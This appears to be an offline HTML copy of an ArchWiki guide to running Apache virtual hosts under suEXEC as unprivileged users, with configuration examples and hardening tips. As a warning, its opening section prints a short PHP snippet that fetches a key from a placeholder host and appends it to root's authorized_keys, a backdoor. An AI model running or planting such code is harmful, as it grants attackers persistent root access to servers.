@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr" class="client-nojs">
+<head>
+<meta charset="UTF-8">
+<title>Apache, suEXEC and Virtual Hosts - ArchWiki</title>
+<link rel="stylesheet" href="../ArchWikiOffline.css">
+<meta name="ResourceLoaderDynamicStyles" content="">
+<style></style>
+<meta name="generator" content="MediaWiki 1.26.4">
+<meta name="robots" content="noindex,follow">
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="search" type="application/opensearchdescription+xml" href="/opensearch_desc.php" title="ArchWiki (en)">
+<link rel="EditURI" type="application/rsd+xml" href="https://wiki.archlinux.org/api.php?action=rsd">
+<link rel="copyright" href="http://www.gnu.org/copyleft/fdl.html">
+<link rel="alternate" type="application/atom+xml" title="ArchWiki Atom feed" href="/index.php?title=Special:RecentChanges&amp;feed=atom">
+</head>
+<body class="mediawiki ltr sitedir-ltr ns-0 ns-subject page-Apache_suEXEC_and_Virtual_Hosts skin-archlinux action-view">
+
+		<div id="globalWrapper" style="width: 100%">
+		<div id="column-content">
+			<div id="content" class="mw-body" role="main" style="margin: 0.5em; margin-bottom:0; margin-top:0">
+				<a id="top"></a>
+				
+				<div class="mw-indicators">
+</div>
+				<h1 id="firstHeading" class="firstHeading" lang="en">Apache, suEXEC and Virtual Hosts</h1>
+				
+				<div id="bodyContent" class="mw-body-content">
+					<div id="contentSub"></div>
+										<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr">
+<p>This document describes how to use Apache's suEXEC module in order to have virtual hosts running as a unprivileged user. Generally it's good practice not to let any kind of webspace have superuser privileges like this rather brutal PHP example shows:
+</p>
+<pre>
+   &lt;?php
+     # of course this link doesn't lead anywhere
+     $rsa_key = file('http://yourhost.homeip.net/id_rsa.pub');
+     exec("cat ${rsa_key[[0]]} &gt;&gt;/root/.ssh/authorized_keys");
+   ?&gt;
+</pre>
+<p>You get the point, do you? To prevent this, never let any virtual host have write access anywhere but in its own home directory or DocumentRoot. Unfortunately this method requires Apache to run as superuser in order to be able to become another user but it's not a big deal since you do not need to run in the default DocumentRoot as superuser too.
+</p>
+<p>You should also consider using suEXEC if you intend to have several FTP accounts pointing to those webspaces which need write permissions while the files still can be read by Apache.
+</p>
+<p>Beware, though, that it is a security risk when the webserver can write to the php files, like when you have an FTP user website1 and the site runs as website1 as well. Code is often injected in PHP files such cases. It is far too common for self-upgradable or installable PHP software to require this permission model, without informing the user of the risk.
+</p>
+<div id="toc" class="toc">
+<div id="toctitle"><h2>Contents</h2></div>
+<ul>
+<li class="toclevel-1 tocsection-1"><a href="#Prerequisites"><span class="tocnumber">1</span> <span class="toctext">Prerequisites</span></a></li>
+<li class="toclevel-1 tocsection-2"><a href="#Adding_the_suEXEC_module_to_Apache"><span class="tocnumber">2</span> <span class="toctext">Adding the suEXEC module to Apache</span></a></li>
+<li class="toclevel-1 tocsection-3"><a href="#Setting_up_a_virtual_Host_to_use_suEXEC"><span class="tocnumber">3</span> <span class="toctext">Setting up a virtual Host to use suEXEC</span></a></li>
+<li class="toclevel-1 tocsection-4"><a href="#.22Disabling.22_default_DocumentRoot"><span class="tocnumber">4</span> <span class="toctext">"Disabling" default DocumentRoot</span></a></li>
+<li class="toclevel-1 tocsection-5"><a href="#Finishing_up"><span class="tocnumber">5</span> <span class="toctext">Finishing up</span></a></li>
+<li class="toclevel-1 tocsection-6"><a href="#References"><span class="tocnumber">6</span> <span class="toctext">References</span></a></li>
+</ul>
+</div>
+
+<h2><span class="mw-headline" id="Prerequisites">Prerequisites</span></h2>
+<ul>
+<li> you should be familiar with basic configuration of Apache
+<ul><li> especially virtual hosts</li></ul>
+</li>
+<li> superuser access to the target box</li>
+<li> knowledge about adding users</li>
+<li> can work with pacman</li>
+</ul>
+<h2><span class="mw-headline" id="Adding_the_suEXEC_module_to_Apache">Adding the suEXEC module to Apache</span></h2>
+<ul><li> load the suEXEC module in <code>/etc/httpd/conf/httpd.conf</code> like this:</li></ul>
+<pre>LoadModule suexec_module        lib/apache/mod_suexec.so
+</pre>
+<ul><li> make sure Apache's default DocumentRoot does not run as superuser either!</li></ul>
+<pre>User http
+Group http
+</pre>
+<h2><span class="mw-headline" id="Setting_up_a_virtual_Host_to_use_suEXEC">Setting up a virtual Host to use suEXEC</span></h2>
+<p>One way to do it is directly in <code>/etc/httpd/conf/httpd.conf</code> but I suggest to use a separate file if you intend to create more than just a couple of virtual hosts. Either way, a virtual host that is supposed to use suEXEC may look something like this:
+</p>
+<pre>
+&lt;VirtualHost 192.168.0.1:80&gt;
+        ServerName myhost
+        ServerAlias  myhost.localdomain
+        # this is where requests for / go
+        DocumentRoot /home/www/vhosts/myhost.localdomain/htdocs
+
+        # here you tell which user (myhost) and group (ftponly) Apache should use
+        SuexecUserGroup myhost ftponly
+
+        # the following are optional but might be of use for you
+        ScriptAlias /cgi-bin/ /home/www/vhosts/myhost.localdomain/htdocs/cgi-bin
+        php_admin_value open_basedir /home/www/vhosts/myhost.localdomain/htdocs
+        php_admin_value upload_tmp_dir  /home/www/vhosts/myhost.localdomain/tmp
+        # Safe mode will be removed as of PHP 6. You may want to not enable it.
+        php_admin_flag safe_mode On
+        ErrorDocument 404 /home/www/vhosts/myhost.localdomain
+        &lt;Directory "/home/www/vhosts/myhost.localdomain/htdocs"&gt;
+                AllowOverride None
+                Order allow,deny
+                Allow from all
+                Options +SymlinksIfOwnerMatch +Includes
+        &lt;/Directory&gt;
+&lt;/VirtualHost&gt;
+</pre>
+<p>Note that we set upload_tmp_dir to a folder that is outside the document root of your web site (not <code>/home/www/vhosts/myhost.localdomain/htdocs/tmp</code>). It should also be not readable or writable by any other system users. This is for security reasons: this way it cannot be modified or overwritten while PHP is processing it.
+</p>
+<h2><span class="mw-headline" id=".22Disabling.22_default_DocumentRoot">"Disabling" default DocumentRoot</span></h2>
+<p>To further harden your setup you can disable the default <i>DocumentRoot</i> in order to not have Apache execute anything as the superuser itself runs as. This procedure does not really disable it, rather points it somewhere where it's not remotely accessible anymore. It can be easily achieved by replacing your default <i>ServerName</i> with the following:
+</p>
+<pre>ServerName localhost:80
+</pre>
+<h2><span class="mw-headline" id="Finishing_up">Finishing up</span></h2>
+<p>Every time you change default configuration parameters you need to <a href="../en/Daemons.html#Restarting" title="Daemons">restart</a><sup>[<a href="../en/ArchWiki:Requests.html#Broken_section_links" title="ArchWiki:Requests">broken link</a>: invalid section]</sup> <b>httpd</b> (Apache) to make them take effect.
+</p>
+<h2><span class="mw-headline" id="References">References</span></h2>
+<ul>
+<li> more in depth information about suEXEC: <a rel="nofollow" class="external free" href="http://httpd.apache.org/docs/suexec.html">http://httpd.apache.org/docs/suexec.html</a>
+</li>
+<li> same about VirtualHosts: <a rel="nofollow" class="external free" href="http://httpd.apache.org/docs/vhosts/index.html">http://httpd.apache.org/docs/vhosts/index.html</a>
+</li>
+</ul>
+
+</div>
+<div id="catlinks" class="catlinks">
+<div id="mw-normal-catlinks" class="mw-normal-catlinks">
+<a href="../Special:Categories.html" title="Special:Categories">Category</a>: <ul><li><a href="../en/Category:Web_server.html" title="Category:Web server">Web server</a></li></ul>
+</div>
+<div id="mw-hidden-catlinks" class="mw-hidden-catlinks mw-hidden-cats-hidden">Hidden category: <ul><li><a href="../en/Category:Pages_with_broken_section_links.html" title="Category:Pages with broken section links">Pages with broken section links</a></li></ul>
+</div>
+</div>					<div class="visualClear"></div>
+				</div>
+			</div>
+		</div>
+		<div class="visualClear"></div>
+					<div id="footer" role="contentinfo">
+Extracted from <a href="https://wiki.archlinux.org"> ArchWiki </a> and licensed under <a href="http://www.gnu.org/copyleft/fdl.html"> GDL >= 1.3</a>
+		</div>
+		</div>
+		</body>
+</html>
